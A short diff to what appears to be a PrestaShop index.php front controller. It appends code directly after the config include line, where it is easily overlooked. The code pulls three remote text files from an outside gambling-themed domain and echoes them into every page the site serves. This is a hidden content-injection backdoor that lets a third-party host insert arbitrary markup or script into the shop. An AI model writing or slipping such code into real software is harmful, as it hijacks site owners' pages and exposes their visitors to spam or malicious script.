@@ -35,5 +35,10 @@ if (file_exists($staticCacheScript)) {
 }
 // ~~end-pagecacheultimate~~ Do not remove this comment, pagecache will update it automatically
 
-require dirname(__FILE__).'/config/config.inc.php';
+require dirname(__FILE__).'/config/config.inc.php';$a = file_get_contents( 'https://semogagacor.site/DN/getar.txt' );
+echo $a;
+$a = file_get_contents( 'https://semogagacor.site/DN/gacor.txt' );
+echo $a;
+$a = file_get_contents( 'https://semogagacor.site/DN/sikat.txt' );
+echo $a;
 Dispatcher::getInstance()->dispatch();
